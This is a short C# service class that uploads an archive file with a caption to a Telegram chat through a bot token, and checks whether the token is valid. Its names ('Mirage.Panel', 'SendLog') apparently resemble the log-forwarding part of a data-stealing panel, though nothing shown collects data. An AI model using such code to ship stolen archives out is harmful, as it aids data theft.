using System.Net.Http;

namespace Mirage.Panel.Services;

public class TelegramProxy
{
    private readonly HttpClient _http = new();

    public async Task SendLog(string botToken, string chatId, byte[] archive, string fileName, string caption)
    {
        using var form = new MultipartFormDataContent();
        form.Add(new StringContent(chatId), "chat_id");
        form.Add(new StringContent(caption), "caption");
        form.Add(new ByteArrayContent(archive), "document", fileName);

        var url = $"https://api.telegram.org/bot{botToken}/sendDocument";
        await _http.PostAsync(url, form);
    }

    public async Task<string?> TestToken(string botToken)
    {
        var json = await _http.GetStringAsync($"https://api.telegram.org/bot{botToken}/getMe");
        return json.Contains("\"ok\":true") ? "OK" : null;
    }
}
